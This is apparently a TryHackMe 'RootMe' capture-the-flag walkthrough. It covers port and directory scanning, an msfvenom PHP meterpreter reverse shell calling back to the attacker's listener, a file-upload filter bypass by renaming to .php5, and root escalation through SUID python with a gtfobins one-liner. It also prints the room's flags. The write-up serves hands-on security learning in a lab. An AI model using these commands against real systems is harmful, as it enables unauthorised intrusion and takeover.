# Task 1: Deploy the machine
# Task 2: Reconnaissance
### Scan the machine, how many ports are open?
_nmap -Pn -sV -vv <ip_addr>_
**2**
### What version of Apache is running?
**2.4.29**
### What service is running on port 22?
**SSH**
###  Find directories on the web server using the GoBuster tool.
_gobuster dir -u <ip_addr> -w /usr/share/wordlists/dirb/common.txt_
### What is the hidden directory?
**/panel/**
# Task 3: Getting a shell
#### Hint: Search for "file upload bypass" and "PHP reverse shell"
### First: create a PHP reverse shell. I used msfvenom.
_msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php_

Since I used a meterpreter reverse shell, I had to open a meterpreter listener.
_msfconsole_
_use exploit/multi/handler_
_set payload php/meterpreter_reverse_tcp_
_set LHOST <my_ip_addr>_
_set LPORT<a_port_to_listen_on>_ _(I used the default: port 4444)_
_exploit_
I left the listener there.

### Second: File upload bypass
Opening "_http://<ip_addr>/panel/_", an upload page appears. I tried uploading shell.php file that I just made but the page returned something like "PHP upload is not allowed" in Spanish. 
So I searched for "PHP file upload bypass". I found out that it is possible to upload an execute the .php file by renaming it to another php-ish extension. I chose shell.php5. After that uploading is simple.

### Third: Executing the malicious PHP file
I had a hard time with this as I had no clue how to execute the file once it was uploaded.
Turns out I can use cURL to open the file
_curl http://<ip_addr>/uploads/shell.php5_
With this, my listener got the signal and there I had a meterpreter shell.
The file I had to find named "user.txt". Not much more info there, and meterpreter doesn't have a "find" or "locate" command. So I dropped into the system shell.
_shell_
_find / -type -f -name user.txt 2>/dev/null_
- -type f:  Tell 'find' to look exclusively for files
- -name user.txt: Specify the filename
- 2>/dev/null: Error messages do not show up as part of the result.
_I took all this from a [writeup](https://beginninghacking.net/2020/09/09/try-hack-me-rootme/) by lightkunyagami on THM_

Now we get the flag
_cat /var/www/user.txt_
**THM{y0u_g0t_a_sh3ll}**
# Task 4 Privilege escalation
### Search for files with SUID permission, which file is weird?
SUID (**S**et owner **U**ser **ID** up on execution) is a special file permission. It temporary gives the user executing the file the file's owner's permissions. In another word, the user executing the file will have the UID and GID of the file's owner (English is hard).

_find / type -f -user root -perm -u=s 2>/dev/null_

- -u=s: Owner has the setuid or SUID bit
	
For some reason, /usr/bin/python is the weird file.
**/usr/bin/python**

### Find a form to escalate your privileges.
#### Hint: Search for gtfobins
Searched for gtfobins and I got [gtfobins.github.io](https://gtfobins.github.io/). Since the file with SUID permission was python:
_python -c 'import os; os.execl("/bin/sh", "sh", "-p")_
_whoami_
I got root as the result.
_cd /root_
_cat root.txt_
**THM{pr1v1l3g3_3sc4l4t10n}**

# **And we're done**